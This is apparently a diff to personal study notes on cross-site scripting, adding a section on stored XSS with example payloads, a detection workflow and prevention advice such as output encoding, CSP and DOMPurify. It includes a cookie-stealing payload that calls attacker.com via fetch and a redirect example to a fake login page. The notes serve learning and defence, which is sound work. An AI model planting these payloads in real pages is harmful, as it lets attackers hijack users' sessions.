@@ -22,9 +22,74 @@ eg: <script> alert("hello") </script> => into input box
     <script> window.location.href="hacker.login.php"</script>
 
 ### Stored xss
-well i am not sure what we do in this specific but i have an idea that here the script is already stored inside the link and when people just click the link it automatically run or soemthng like that 
-lets see when we read it what that is about
 
+
+Stored (Persistent) XSS: malicious input is saved server-side (DB, file, queue) and later rendered to other users **without encoding** — no victim interaction needed beyond a normal page visit.
+
+---
+
+#### 1. Classic Payload (old-school)
+
+```html
+<script>alert(document.cookie)</script>
+```
+Saved raw in DB → injected via `innerHTML` / unescaped templates → executes on load.
+
+#### 2. Modern Payload (frameworks/CSP era)
+
+Targets attribute-breakout + event handlers, since frameworks auto-escape text bindings:
+
+```html
+"><img src=x onerror=fetch('http://attacker.com/steal?cookie='+document.cookie)>
+```
+Fires only when app uses an unsafe sink:
+- React: `dangerouslySetInnerHTML`
+- Vue: `v-html`
+- Angular: `[innerHTML]` / `bypassSecurityTrustHtml`
+
+---
+
+#### 3. Detection Workflow
+
+1. **Map inputs** — comments, bio, filenames, headers (`User-Agent`, `Referer`), etc.
+2. **Inject canary** — `XSSCANARY123`
+3. **Trace output** — check admin panels, dashboards, public feeds
+4. **Test encoding** — send `< > " '` and see if they come back raw or encoded
+
+Tools: Burp Suite Scanner, OWASP ZAP.
+
+---
+
+#### 4. Prevention
+
+**Output encoding (primary defense):**
+
+| Char | Encoded |
+|------|---------|
+| `<`  | `&lt;`  |
+| `>`  | `&gt;`  |
+| `"`  | `&quot;`|
+| `'`  | `&#x27;`|
+
+**Safe DOM APIs:**
+```js
+// Bad
+el.innerHTML = userInput;
+
+// Good
+el.textContent = userInput;
+```
+
+**CSP header:**
+```http
+Content-Security-Policy: default-src 'self'; script-src 'self';
+```
+
+**Rich text needed?** Sanitize with a maintained library:
+```js
+import DOMPurify from 'dompurify';
+el.innerHTML = DOMPurify.sanitize(userInput);
+```
 
 ## To check if xss is possible
 
